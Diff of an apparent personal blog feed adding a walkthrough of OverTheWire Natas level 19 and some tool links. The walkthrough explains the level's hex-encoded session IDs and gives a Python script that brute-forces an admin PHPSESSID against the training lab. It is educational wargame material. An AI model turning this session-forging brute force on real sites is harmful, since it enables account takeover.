@@ -368,6 +368,35 @@ for i in range(1, 640):
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sure enough, one particular ID granted the password.&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;level-19&#34;&gt;Level 19&lt;/h2&gt;
+&lt;p&gt;Similarly, this level is looking for you to login using a PHPSESSID, but this time the IDs are &amp;ldquo;not sequential&amp;rdquo; according to the page.&lt;/p&gt;
+&lt;p&gt;Clicking the login button with no credentials gives us a PHPSESSID of a seemingly random hex string always ending with 2d (a hyphen).&lt;/p&gt;
+&lt;p&gt;After running a script to automate this hundreds of times I have confirmed that the same ID range is still in use&amp;ndash;1 to 640. The id is simply converted to it&amp;rsquo;s hex ascii value. So for example, instead of seeing 250, we see 3235302d.&lt;/p&gt;
+&lt;p&gt;If we now login with a username, we get back a longer cookie. This time it will again be the same random id with a hyphen, but added onto the end is a hex ascii representation of the username typed in.&lt;/p&gt;
+&lt;p&gt;Using a password does nothing, which tells me that the password is not implemented at all, most likely.&lt;/p&gt;
+&lt;p&gt;So since we need to login as admin, we can be sure that the suffix of the cookie needs to be &amp;ldquo;61646d696e&amp;rdquo;. Then we can just try using all 640 possible values with the admin suffix added at the end until one of them works. Here&amp;rsquo;s the script I used for that:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://natas19.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas19&amp;quot;, &amp;quot;{censored}&amp;quot;)
+form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;}
+cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}
+  
+for i in range(1, 640):
+        # convert id to hex and append &amp;quot;admin&amp;quot; suffix
+        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = &amp;quot;&amp;quot;
+        for j in str(i):
+              cookie_data[&amp;quot;PHPSESSID&amp;quot;] += hex(ord(j)).lstrip(&amp;quot;0x&amp;quot;)
+        cookie_data[&amp;quot;PHPSESSID&amp;quot;] += &amp;quot;2d61646d696e&amp;quot;
+        
+        response = requests.post(url, cookies=cookie_data, auth=credentials, data=form_data)
+        print(response.text)
+        print(&amp;quot;guess:&amp;quot;, i, &amp;quot;|&amp;quot;, cookie_data[&amp;quot;PHPSESSID&amp;quot;])
+
+        if &amp;quot;You are logged in as a regular user.&amp;quot; not in response.text:
+            break
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I was able to get the password to natas20 by running this script.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-20&#34;&gt;Level 20&lt;/h2&gt;
 &lt;p&gt;(coming soon)&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/natas/ - </description>
         </item>
@@ -399,6 +428,9 @@ for i in range(1, 640):
 &lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;https://armconverter.com/decryptedappstore&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;https://img.doerig.dev/&lt;/a&gt; - instant imgur upload&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://flowchart.fun/&#34;&gt;https://flowchart.fun/&lt;/a&gt; - &lt;a href=&#34;https://github.com/tone-row/flowchart-fun&#34;&gt;https://github.com/tone-row/flowchart-fun&lt;/a&gt; - Easy typed flowchart maker (for plotting out program flow)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://draw.io/&#34;&gt;https://draw.io/&lt;/a&gt; - Another web based flowchart maker&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://processhacker.sourceforge.io/&#34;&gt;https://processhacker.sourceforge.io/&lt;/a&gt; - The task manager that Microshaft &lt;em&gt;should have&lt;/em&gt; given you.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wiki.osdev.org/&#34;&gt;https://wiki.osdev.org/&lt;/a&gt; - Wiki for low-level stuff and how operating systems work&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/links/ - </description>
         </item>
     
